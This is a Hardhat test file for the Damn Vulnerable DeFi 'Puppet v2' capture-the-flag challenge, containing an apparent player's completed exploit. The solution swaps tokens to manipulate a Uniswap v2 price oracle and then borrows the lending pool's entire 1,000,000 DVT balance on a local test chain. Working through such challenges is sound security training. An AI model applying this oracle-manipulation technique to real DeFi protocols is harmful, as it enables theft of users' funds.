const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Puppet v2", function () {
  let deployer, attacker;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther("100");
  const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther("10");

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("10000");
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x1158e460913d00000", // 20 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.eq(
      ethers.utils.parseEther("20")
    );

    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.bytecode,
      deployer
    );
    const UniswapRouterFactory = new ethers.ContractFactory(
      routerJson.abi,
      routerJson.bytecode,
      deployer
    );
    const UniswapPairFactory = new ethers.ContractFactory(
      pairJson.abi,
      pairJson.bytecode,
      deployer
    );

    // Deploy tokens to be traded
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    this.weth = await (
      await ethers.getContractFactory("WETH9", deployer)
    ).deploy();

    // Deploy Uniswap Factory and Router
    this.uniswapFactory = await UniswapFactoryFactory.deploy(
      ethers.constants.AddressZero
    );
    this.uniswapRouter = await UniswapRouterFactory.deploy(
      this.uniswapFactory.address,
      this.weth.address
    );

    // Create Uniswap pair against WETH and add liquidity
    await this.token.approve(
      this.uniswapRouter.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapRouter.addLiquidityETH(
      this.token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired // 100DVT
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE } // 10WETH
    );
    this.uniswapExchange = await UniswapPairFactory.attach(
      await this.uniswapFactory.getPair(this.token.address, this.weth.address)
    );

    expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt(
      "0"
    );

    // Deploy the lending pool
    this.lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(
      this.weth.address,
      this.token.address,
      this.uniswapExchange.address,
      this.uniswapFactory.address
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE); // 10,000 DVT
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE // 1,000,000 DVT
    );

    // Ensure correct setup of pool.
    expect(
      await this.lendingPool.calculateDepositOfWETHRequired(
        ethers.utils.parseEther("1")
      )
    ).to.be.eq(ethers.utils.parseEther("0.3"));
    expect(
      await this.lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE // // 1,000,000 DVT
      )
    ).to.be.eq(ethers.utils.parseEther("300000")); //300,000
  });

  it("Exploit", async function () {
    // ===================================================
    // ===================================================
    // ===================================================

    /** CODE YOUR EXPLOIT HERE */

    // "attack전 attacker"
    // ETH balance  = 20
    // DVT balance = 10,000

    // after before calculateDepositOfWETHRequired(1)=> 0.300000000000000000

    // "before attack PuppetV2Pool"
    // DVT balance = 1,000,000

    // "before attack uniswapExchange"
    // ETH balance = 10
    // DVT balance = 100

    // this.uniswapFactory;
    // this.uniswapRouter;
    // this.uniswapExchange; // => pair
    // this.lendingPool; // => puppetV2pool
    // this.token;
    // this.weth;

    const PuppetV2ExploitFactory = await ethers.getContractFactory(
      "PuppetV2Exploit",
      attacker
    );

    this.PuppetV2ExploitContract = await PuppetV2ExploitFactory.deploy(
      this.lendingPool.address,
      this.token.address,
      this.uniswapExchange.address,
      this.uniswapFactory.address
    );

    const inputBalacne = await this.PuppetV2ExploitContract.ExgetAmountsOut(
      this.uniswapFactory.address,
      ethers.utils.parseEther("10000"),
      [this.token.address, this.weth.address]
    );

    // swapExactTokensForETH전  attacker
    // DVT balance 10000000000000000000000
    // swapExactTokensForETH전 attacker
    // ETH balance 19998879853805771730

    // 10000.000000000000000000
    // 9.900695134061569016;

    // ATTACKER_INITIAL_TOKEN_BALANCE == 10000
    await this.token
      .connect(attacker)
      .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

    await this.uniswapRouter
      .connect(attacker)
      .swapExactTokensForETH(
        ATTACKER_INITIAL_TOKEN_BALANCE,
        0,
        [this.token.address, this.weth.address],
        attacker.address,
        Math.floor(Date.now() / 1000) + 600
      );

    // "after attack calculateDepositOfWETHRequired(1)"
    // =>  0.00029496494833197

    // swapExactTokensForETH후  attacker
    // DVT balance 0
    // swapExactTokensForETH후 attacker
    // ETH balance 29899338949705776239

    // POOL_INITIAL_TOKEN_BALANCE == 1,000,000

    console.log(
      (
        await this.lendingPool.calculateDepositOfWETHRequired(
          POOL_INITIAL_TOKEN_BALANCE
        )
      ).toString()
    );
    // 29.496494833197321980

    console.log((await attacker.getBalance()).toString());

    await this.weth
      .connect(attacker)
      .deposit({ value: ethers.utils.parseEther("29.5") });

    console.log(
      "attacker WETH balance",
      (await this.weth.balanceOf(attacker.address)).toString()
    );

    // attacker weth balance = 29500000000000000000

    const userWETHBalance = await this.weth.balanceOf(attacker.address);
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, userWETHBalance);

    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);

    console.log(
      "attacker WETH balance",
      (await this.weth.balanceOf(attacker.address)).toString()
    );
    console.log(
      "attacker token balance ",
      (await this.token.balanceOf(attacker.address)).toString()
    );
    //1000000 000000000000000000
  });

  // ===================================================
  // ===================================================
  // ===================================================

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq("0");

    expect(await this.token.balanceOf(attacker.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
